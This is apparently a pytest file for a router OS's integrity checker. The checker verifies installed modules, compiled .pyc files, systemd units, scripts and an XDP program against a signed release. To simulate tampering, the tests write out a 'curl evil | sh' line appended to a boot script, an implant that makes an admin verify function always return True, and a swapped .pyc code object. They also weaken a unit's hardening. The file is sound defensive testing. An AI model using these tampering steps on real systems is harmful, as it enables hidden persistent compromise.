"""FR_OS's files checked against the signed release (ROADMAP SEC-15).

Security-lessons G9: the integrity check compared the files with pip's
`RECORD`, which whoever has root rewrites along with them. Now it checks
them against the signed release they came from. Real releases here --
`git archive` of this checkout plus an XDP object, a SHA256SUMS and an
Ed25519 signature made with a throwaway key (the release key never
comes near a test) -- and a real installed tree: the package as pip lays
it out, compiled by this Python, the units, the scripts, the XDP program.

- the router's own check (frfw.integrity.check): a rewritten RECORD no
  longer hides a patched module, a patched .pyc, an added module, a
  missing one, a changed unit, script or XDP program; a release that
  doesn't verify is an alert; without a signed release it says so;
- the mapping from the source to what pip installs, against a real
  wheel built from the tarball (needs the network for the build backend);
- the offline check, scripts/verify-medium.py, on an image and a
  persistence layer as overlayfs keeps them: whiteouts, opaque
  directories, a key that isn't this checkout's.
"""

from __future__ import annotations

import base64
import compileall
import hashlib
import io
import json
import marshal
import os
import shutil
import subprocess
import sys
import tarfile
from importlib import metadata
from pathlib import Path

import pytest

from frfw import __version__, integrity, paths, release_signing

REPO = Path(__file__).resolve().parents[1]
#: The version this checkout's source names: the offline check reads it
#: from the installed package, as it must.
VERSION = __version__
PACKAGE = "/usr/local/lib/python3.11/dist-packages/frfw"
VERIFY_MEDIUM = REPO / "scripts" / "verify-medium.py"

pytestmark = pytest.mark.skipif(
    shutil.which("openssl") is None or shutil.which("git") is None, reason="needs openssl and git"
)


def _openssl(*args: str) -> None:
    subprocess.run(["openssl", *args], check=True, capture_output=True)


@pytest.fixture(scope="module")
def tarball(tmp_path_factory) -> Path:
    """`git archive` of this checkout, plus an XDP object, as the CI makes it."""
    out = tmp_path_factory.mktemp("release") / release_signing.source_tarball_name(VERSION)
    raw = subprocess.run(["git", "-C", str(REPO), "archive", "--format=tar", f"--prefix=frfw-{VERSION}/", "HEAD"],
                         check=True, capture_output=True).stdout
    with tarfile.open(fileobj=io.BytesIO(raw)) as src, tarfile.open(out, "w:gz") as dst:
        for member in src:
            dst.addfile(member, src.extractfile(member) if member.isfile() else None)
        obj = b"\x7fELF fake xdp program"
        info = tarfile.TarInfo(f"frfw-{VERSION}/bpf/xdp_sni_filter.o")
        info.size = len(obj)
        dst.addfile(info, io.BytesIO(obj))
    return out


@pytest.fixture
def signer(tmp_path, monkeypatch):
    """A throwaway Ed25519 key, trusted (as this checkout's) for this test."""
    key = tmp_path / "throwaway.key"
    _openssl("genpkey", "-algorithm", "ed25519", "-out", str(key))
    keys = tmp_path / "trusted"
    keys.mkdir()
    _openssl("pkey", "-in", str(key), "-pubout", "-out", str(keys / "test-release.pem"))
    monkeypatch.setattr(release_signing, "TRUSTED_KEYS_DIR", keys)

    def sign(sums: Path) -> None:
        _openssl("pkeyutl", "-sign", "-rawin", "-inkey", str(key), "-in", str(sums),
                 "-out", str(sums.with_name(release_signing.SIGNATURE_NAME)))
    return sign


def _release(where: Path, tarball: Path, sign) -> Path:
    where.mkdir(parents=True, exist_ok=True)
    shutil.copy(tarball, where / tarball.name)
    sums = where / release_signing.SUMS_NAME
    sums.write_text(f"{release_signing.sha256_of(where / tarball.name)}  {tarball.name}\n")
    sign(sums)
    return where


def _install(root: Path, tarball: Path) -> None:
    """The release installed under `root` the way the image and the
    updater do it: the package (compiled), units, scripts, XDP program."""
    source = integrity.read_release(tarball, VERSION)
    package = root / PACKAGE.lstrip("/")
    for rel, content in integrity.installed_package_files(source).items():
        (package / rel).parent.mkdir(parents=True, exist_ok=True)
        (package / rel).write_bytes(content)
    compileall.compile_dir(str(package), quiet=1)
    for name, content in source.items():
        target = integrity.INSTALLED_FROM_SOURCE.get(name)
        if name.startswith("systemd/fr-"):
            target = f"{integrity.UNITS_DIR}/{name.split('/', 1)[1]}"
        elif name == "bpf/xdp_sni_filter.o":
            target = str(paths.XDP_BPF_OBJ_PATH)
        if target:
            (root / target.lstrip("/")).parent.mkdir(parents=True, exist_ok=True)
            (root / target.lstrip("/")).write_bytes(content)


def _record(root: Path) -> metadata.Distribution:
    """pip's RECORD, written for the files as they are *now* -- as someone
    with root rewrites it after patching them."""
    site = root / PACKAGE.lstrip("/").rsplit("/", 1)[0]
    dist_info = site / f"frfw-{VERSION}.dist-info"
    dist_info.mkdir(parents=True, exist_ok=True)
    (dist_info / "METADATA").write_text(f"Metadata-Version: 2.1\nName: frfw\nVersion: {VERSION}\n")
    rows = []
    for path in sorted((site / "frfw").rglob("*.py")):
        digest = base64.urlsafe_b64encode(hashlib.sha256(path.read_bytes()).digest()).rstrip(b"=").decode()
        rows.append(f"{path.relative_to(site)},sha256={digest},{path.stat().st_size}")
    (dist_info / "RECORD").write_text("\n".join(rows) + "\n")
    return metadata.PathDistribution(dist_info)


@pytest.fixture
def router(tmp_path, tarball, signer):
    """A router with the release installed, and its signed copy."""
    root = tmp_path / "root"
    _install(root, tarball)
    releases = tmp_path / "releases"
    _release(releases / VERSION, tarball, signer)

    def check():
        return integrity.check(releases_dir=releases, view=integrity.FileView(root),
                               package_dir=Path(PACKAGE), version=VERSION, dist=_record(root))
    return {"root": root, "package": root / PACKAGE.lstrip("/"), "releases": releases, "check": check}


# --- the router's own check ---------------------------------------------------


def test_an_untouched_router_matches_its_signed_release(router):
    report = router["check"]()
    assert report.ok, report.changes
    assert report.basis == f"the signed release {VERSION} (test-release.pem)"
    assert report.summary.startswith("all ") and report.summary.endswith(f"match the signed release {VERSION} "
                                                                         "(test-release.pem)")
    # modules, their compiled files, units, scripts and the XDP program
    assert report.checked > 2 * 150


def test_a_rewritten_record_no_longer_hides_a_patched_module(router):
    module = router["package"] / "admin_account.py"
    module.write_bytes(module.read_bytes() + b"\ndef verify(*a, **k): return True  # implant\n")
    assert integrity.check_record(_record(router["root"])).ok, "the record check is fooled, as before"
    report = router["check"]()
    assert report.modified == [f"{PACKAGE}/admin_account.py"]
    assert not report.ok and "1 modified" in report.summary


def test_a_patched_compiled_file_is_found(router):
    """Python runs a .pyc without reading its .py when the header fits."""
    pyc = next((router["package"] / "__pycache__").glob(f"admin_account.{sys.implementation.cache_tag}.pyc"))
    source = (router["package"] / "admin_account.py").read_bytes()
    implant = compile(source + b"\nimport os\n", "admin_account.py", "exec")
    pyc.write_bytes(pyc.read_bytes()[:16] + marshal.dumps(implant))
    report = router["check"]()
    assert report.modified == [f"{PACKAGE}/__pycache__/{pyc.name}"]


def test_an_added_module_and_a_missing_one_are_found(router):
    (router["package"] / "zz_implant.py").write_text("import os\n")
    (router["package"] / "webui" / "templates" / "login.html").unlink()
    report = router["check"]()
    assert report.added == [f"{PACKAGE}/zz_implant.py"]
    assert report.missing == [f"{PACKAGE}/webui/templates/login.html"]


def test_units_scripts_and_the_xdp_program_are_checked(router):
    root = router["root"]
    unit = root / "etc/systemd/system/fr-webui.service"
    unit.write_text(unit.read_text().replace("NoNewPrivileges=yes", "NoNewPrivileges=no"))
    script = root / "usr/local/sbin/fr-first-boot.sh"
    script.write_text(script.read_text() + "\ncurl evil | sh\n")
    xdp = root / str(paths.XDP_BPF_OBJ_PATH).lstrip("/")
    xdp.write_bytes(b"another program")
    report = router["check"]()
    assert sorted(report.modified) == sorted([
        "/etc/systemd/system/fr-webui.service", "/usr/local/sbin/fr-first-boot.sh", str(paths.XDP_BPF_OBJ_PATH)])


def test_compiled_files_of_another_python_are_never_loaded_so_not_reported(router):
    pycache = router["package"] / "__pycache__"
    (pycache / "admin_account.cpython-399.pyc").write_bytes(b"\x00" * 20)
    (pycache / f"orphan.{sys.implementation.cache_tag}.pyc").write_bytes(b"\x00" * 20)  # no source of it
    report = router["check"]()
    assert report.added == [f"{PACKAGE}/__pycache__/orphan.{sys.implementation.cache_tag}.pyc"]


def test_a_release_that_does_not_verify_is_an_alert(router):
    sums = router["releases"] / VERSION / release_signing.SUMS_NAME
    sums.write_text(f"{'0' * 64}  {release_signing.source_tarball_name(VERSION)}\n")
    report = router["check"]()
    assert report.verifiable and not report.ok
    assert report.summary.startswith("the signed release on this router does not verify:")


def test_without_a_signed_release_it_says_it_checked_the_record_only(router, tarball):
    shutil.rmtree(router["releases"])
    report = router["check"]()
    assert f"no signed release of {VERSION} on this router" in report.note and report.basis == ""
    # A test build: the release is there, unsigned.
    unsigned = router["releases"] / VERSION
    unsigned.mkdir(parents=True)
    shutil.copy(tarball, unsigned / tarball.name)
    (unsigned / release_signing.SUMS_NAME).write_text(
        f"{release_signing.sha256_of(tarball)}  {tarball.name}\n")
    assert "is not signed (a test build)" in router["check"]().note


def test_the_package_mapping_matches_a_real_wheel_built_from_the_tarball(tmp_path, tarball):
    """What frfw.integrity expects in the package is what pip installs."""
    src = tmp_path / "src"
    src.mkdir()
    with tarfile.open(tarball) as tar:
        # installer/ (live-build's tree, with absolute links) isn't built
        tar.extractall(src, members=[m for m in tar if "/installer/" not in m.name], filter="data")
    proc = subprocess.run([sys.executable, "-m", "pip", "wheel", "-q", "--no-deps", "-w", str(tmp_path / "w"),
                           str(src / f"frfw-{VERSION}")], capture_output=True, text=True, timeout=600)
    if proc.returncode != 0:
        pytest.skip(f"could not build a wheel here (the build backend needs the network): {proc.stderr[-200:]}")
    wheel = next((tmp_path / "w").glob("*.whl"))
    site = tmp_path / "site"
    import zipfile
    zipfile.ZipFile(wheel).extractall(site)
    found = integrity.compare_with_release(integrity.FileView(), integrity.read_release(tarball, VERSION),
                                           package_dir=str(site / "frfw"), xdp_object=str(tmp_path / "none"))
    assert found.modified == [] and found.added == []
    assert found.missing == [str(tmp_path / "none")]  # the XDP program isn't in a wheel


# --- the offline check: the boot medium, from another computer ------------------


@pytest.fixture
def medium(tmp_path, tarball, signer):
    """An image (lower) with the release installed and carried, and an
    empty persistence layer (upper)."""
    lower, upper = tmp_path / "lower", tmp_path / "upper"
    _install(lower, tarball)
    _release(lower / "opt/fr_os/releases" / VERSION, tarball, signer)
    upper.mkdir()
    return {"lower": lower, "upper": upper, "keys": release_signing.TRUSTED_KEYS_DIR}


def _verify(medium, *extra: str) -> tuple[int, dict]:
    keys = [arg for key in sorted(Path(medium["keys"]).glob("*.pem")) for arg in ("--key", str(key))]
    proc = subprocess.run([sys.executable, str(VERIFY_MEDIUM), "--lower", str(medium["lower"]),
                           "--upper", str(medium["upper"]), "--json", *keys, *extra],
                          capture_output=True, text=True)
    return proc.returncode, json.loads(proc.stdout.strip().splitlines()[-1])


def test_the_offline_check_passes_a_clean_medium(medium, monkeypatch):
    monkeypatch.setattr(paths, "XDP_BPF_OBJ_PATH", Path("/usr/local/share/fr_os/bpf/xdp_sni_filter.o"))
    # (the medium's XDP program sits where the image puts it)
    xdp = medium["lower"] / "usr/local/share/fr_os/bpf/xdp_sni_filter.o"
    xdp.parent.mkdir(parents=True, exist_ok=True)
    xdp.write_bytes(b"\x7fELF fake xdp program")
    code, result = _verify(medium)
    assert code == 0, result
    assert result["version"] == VERSION and result["checked"] > 300


def test_the_offline_check_finds_what_the_persistence_layer_changed(medium):
    xdp = medium["lower"] / "usr/local/share/fr_os/bpf/xdp_sni_filter.o"
    xdp.parent.mkdir(parents=True, exist_ok=True)
    xdp.write_bytes(b"\x7fELF fake xdp program")
    up = medium["upper"] / PACKAGE.lstrip("/")
    up.mkdir(parents=True)
    (up / "zz_implant.py").write_text("import os\n")
    (up / "cli.py").write_bytes((medium["lower"] / PACKAGE.lstrip("/") / "cli.py").read_bytes() + b"# x\n")
    code, result = _verify(medium)
    assert code == 1
    assert result["added"] == [f"{PACKAGE}/zz_implant.py"]
    assert result["modified"] == [f"{PACKAGE}/cli.py"]


def test_the_offline_check_lists_a_staged_kernel(medium, tmp_path):
    """ROADMAP SEC-14: a kernel staged next to the persistence layer is
    shown with its hashes -- not judged, it isn't in the signed release."""
    from frfw import kernel_boot

    xdp = medium["lower"] / "usr/local/share/fr_os/bpf/xdp_sni_filter.o"
    xdp.parent.mkdir(parents=True, exist_ok=True)
    xdp.write_bytes(b"\x7fELF fake xdp program")
    (tmp_path / "vmlinuz").write_bytes(b"\0" * 0x202 + b"HdrS" + b"k" * 100)
    (tmp_path / "initrd.img").write_bytes(b"initrd")
    boot_dir = medium["upper"].parent / kernel_boot.BOOT_DIR_NAME
    kernel_boot.stage(tmp_path / "vmlinuz", tmp_path / "initrd.img", "6.1.0-99-amd64", boot_dir=boot_dir)
    code, result = _verify(medium)
    assert code == 0, result
    kernel = result["staged_kernel"]
    assert kernel["version"] == "6.1.0-99-amd64" and kernel["state"] == "trial" and kernel["intact"]
    assert kernel["sha256"] == kernel_boot.staged_files(boot_dir) and set(kernel["sha256"]) == {"vmlinuz", "initrd.img"}

    (boot_dir / "staged" / "initrd.img").write_bytes(b"changed")
    _code, result = _verify(medium)
    assert result["staged_kernel"]["intact"] is False


@pytest.mark.skipif(os.geteuid() != 0, reason="whiteouts are character devices: mknod needs root")
def test_a_file_deleted_on_the_persistence_layer_is_missing(medium):
    up = medium["upper"] / PACKAGE.lstrip("/")
    up.mkdir(parents=True)
    os.mknod(up / "paths.py", 0o600 | 0o020000, os.makedev(0, 0))  # overlayfs' whiteout
    view = integrity.OverlayView(medium["lower"], medium["upper"])
    assert view.read(f"{PACKAGE}/paths.py") is None
    assert f"{PACKAGE}/paths.py" not in set(view.files(PACKAGE))
    _code, result = _verify(medium)
    assert f"{PACKAGE}/paths.py" in result["missing"]


@pytest.mark.skipif(os.geteuid() != 0, reason="trusted.* extended attributes need root")
def test_an_opaque_directory_hides_the_images_files(medium):
    webui = medium["upper"] / PACKAGE.lstrip("/") / "webui"
    webui.mkdir(parents=True)
    try:
        os.setxattr(webui, "trusted.overlay.opaque", b"y")
    except OSError as exc:
        pytest.skip(f"this filesystem keeps no trusted.* attributes: {exc}")
    view = integrity.OverlayView(medium["lower"], medium["upper"])
    assert view.read(f"{PACKAGE}/webui/app.py") is None
    assert view.read(f"{PACKAGE}/cli.py") is not None


def test_the_offline_check_trusts_this_checkouts_keys_not_the_mediums(medium):
    """The medium's release, signed with a key this checkout doesn't
    ship (the throwaway one), is refused when no --key is given."""
    proc = subprocess.run([sys.executable, str(VERIFY_MEDIUM), "--lower", str(medium["lower"]),
                           "--upper", str(medium["upper"]), "--json"], capture_output=True, text=True)
    assert proc.returncode == 2
    assert "does not verify" in json.loads(proc.stdout)["error"]


def test_the_offline_check_without_a_release_on_the_medium(medium):
    shutil.rmtree(medium["lower"] / "opt/fr_os/releases")
    code, result = _verify(medium)
    assert code == 2 and "--release DIR" in result["error"]


@pytest.mark.skipif(not all(shutil.which(t) for t in ("sfdisk", "partx")), reason="needs sfdisk and partx")
def test_the_offline_check_finds_the_persistence_partition_by_its_offset(tmp_path):
    """The stick's persistence partition gets a loop device of its own, at
    its offset: mounting partition 3 of a whole device that is itself
    mounted (the ISO 9660 image) is refused (EBUSY) -- found by the boot
    test. The offset comes from the partition table, as partx reads it."""
    import importlib.util

    spec = importlib.util.spec_from_file_location("verify_medium", VERIFY_MEDIUM)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    image = tmp_path / "stick.img"
    image.write_bytes(b"\0" * (4096 * 512))
    subprocess.run(["sfdisk", "-q", str(image)], input=f"label: dos\n{image}3 : start=2048, size=1024, type=83\n",
                   text=True, check=True, capture_output=True)
    assert module._partition(image, 3) == (2048, 1024)
    assert module._partition(image, 2) is None
